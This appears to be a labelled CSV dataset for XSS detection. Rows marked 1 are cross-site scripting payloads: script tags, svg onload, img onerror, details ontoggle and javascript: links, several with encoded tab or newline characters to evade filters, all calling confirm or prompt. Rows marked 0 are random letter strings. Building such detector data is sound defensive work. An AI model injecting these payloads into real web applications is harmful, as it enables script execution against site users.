payload,label
ZQfcDHMuUXxZHqiCQTecsB HLTvEpYek,0
<%09script>confirm(1)<%09/script>,1
nDaKMzoGNwItYRhMBmwuCyCDedEUWdJkFVPrRqj,0
<svg onload=confirm(1)>,1
eqFXoEGsTBnkfA,0
<%0ascript>prompt(1)<%0a/script>,1
pSEIGobzvKHYRmPqmZSCOmBrbUE,0
<svg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
tizeGUSSVd,0
 fCazYmXHSTiepX,0
HfJYkwQMqdIJqXf yJBGvKQVjJpGhRGNd,0
<details ontoggle=confirm()>,1
HIuVpzswXpCIjNOEBkl ZeLnXmhUI,0
<%0asvg onload=confirm(1)>,1
<%09details ontoggle=confirm()>,1
ZNCTaGrQMFaIdlAxcMWmYYFIjJRkWffGxm,0
I SmahFUUDOAkbjMAD yvvNiEhU pYpbNWGLZe,0
<%0asvg onload=confirm(1)>,1
<script>prompt(1)</script>,1
<%09svg onload=prompt(1)>,1
zXNdjAtQtYFWcRYd,0
ERtPtNxUteZUPRJsUsmsCh TVBrboHNYrE,0
<%0aimg src=x onerror=prompt(1)>,1
NjRNkmefIBwWBeoyR,0
LacYSjvFVitD,0
uJqDYEjboWHAvWS,0
<%09svg onload=prompt(1)>,1
GNpmpFIdXWkpvgVqSlVmnezqTSmret,0
<%0asvg onload=prompt(1)>,1
qGtLPRUaJmMfwEoNTZLLVeIFtLKlSL,0
JcONWAyLwMtERzjAZ SLWB,0
psrnRdyOlMjSOSsPqMNnaEVdtOsevRbdChzatFxQ,0
GZhAmHAyoKtPQJHGofYRY,0
EEc FxSXXjzJjHWwwGRqtNWyMIYDx,0
wgzODiMIRoDxxbOsXYE,0
GDdYvkOTIwqQMlYlpMWQNtyRkWEWuQICh,0
<%09img src=x onerror=prompt(1)>,1
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
ndmGOtKAXSeRKUribjWrO,0
<%0ascript>confirm(1)<%0a/script>,1
<%09svg onload=prompt(1)>,1
yAULyiZHIgzLdgmRXFncgUEMkCMITPWZGIIMZT,0
<%09details ontoggle=confirm()>,1
PzrYPicxDVHmfP,0
<%09details ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
NeMPug a HiYXANqshYCdGikgYgcxGedcJcK,0
<details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
lWmMgziqzMacSxRhbPRvVOusj,0
<%09details ontoggle=confirm()>,1
mTTazszi QNnMhvdgkGoLCNcAPZlcrevc,0
xLMYoRHCMOxrOXoirI,0
<%0asvg onload=confirm(1)>,1
OotzOQykPtBqyOCJf,0
sfEEhzOHSARd,0
<%0ascript>prompt(1)<%0a/script>,1
<%0aimg src=x onerror=prompt(1)>,1
<%09img src=x onerror=confirm(1)>,1
YOkxJbOXGqBMRmKm,0
dEQiQlnsbddkWJBxSknnKPkdk,0
<%09script>confirm(1)<%09/script>,1
<%09svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
UPePvbIIVWbMYKSvBoqjC,0
FuCTSBjUSErEUhNdXEdWYvgHGKZ mpdfIWr,0
tXSpyDcqdhRzIMRZj EnmJv,0
<%09script>confirm(1)<%09/script>,1
HVnBngPCmjWmdh,0
